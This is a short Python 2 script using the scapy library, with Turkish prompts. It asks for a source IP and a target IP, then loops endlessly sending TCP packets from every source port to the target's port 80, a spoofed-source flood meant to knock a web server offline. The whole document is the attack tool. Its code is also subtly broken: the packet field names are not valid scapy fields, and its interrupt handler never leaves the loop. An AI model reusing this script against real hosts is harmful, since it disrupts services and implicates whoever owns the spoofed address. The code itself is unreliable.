from scapy.all import *

srcIP = raw_input("Kaynak IP: ")
dstIP = raw_input("Hedef IP: ")

packetNum = 1

while True:
   try:
      for srcPort in range(1, 65535):
         IP1 = IP(source_IP=srcIP, destination=dstIP)
         TCP1 = TCP(srcport=srcPort, dstport=80)
         pkt = IP1 / TCP1
         send(pkt, inter=0.001)

         print "packet ", packetNum, " gönderildi."
         packetNum = packetNum + 1
   except KeyboardInterrupt:
      print "Program kapatiliyor."
